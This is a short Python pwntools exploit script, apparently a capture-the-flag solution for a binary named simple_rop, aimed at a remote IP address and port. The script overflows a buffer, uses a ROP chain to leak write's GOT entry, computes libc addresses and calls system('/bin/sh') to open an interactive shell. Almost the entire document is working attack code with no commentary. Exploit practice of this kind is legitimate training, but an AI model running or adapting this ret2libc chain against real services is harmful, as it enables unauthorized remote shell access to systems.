from pwn import *

DEBUG = False
if DEBUG:
    p = process(['./simple_rop'])
else:
    p = remote('3.34.53.13', 4147)
libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")
context.log_level = 'debug'

main = 0x400537
write = 0x400430
read = 0x400440
write_got = 0x601018
read_got = 0x601020

poprdi = 0x4005E3
poprsi = 0x4005E1

payload = 'A' * 0x18
payload += p64(poprdi)
payload += p64(1)
payload += p64(poprsi)
payload += p64(write_got)
payload += p64(1337)
payload += p64(write)
payload += p64(main)

p.sendlineafter('?', payload)

write_addr = u64(p.recv(6)+"\x00\x00")
system_addr = write_addr - libc.symbols["write"] + libc.symbols["system"]
binsh_addr = write_addr - libc.symbols["write"] + libc.search("/bin/sh").next()

payload = 'A' * 0x18
payload += p64(poprdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendlineafter('?', payload.ljust(0x30, '\x00'))

p.interactive()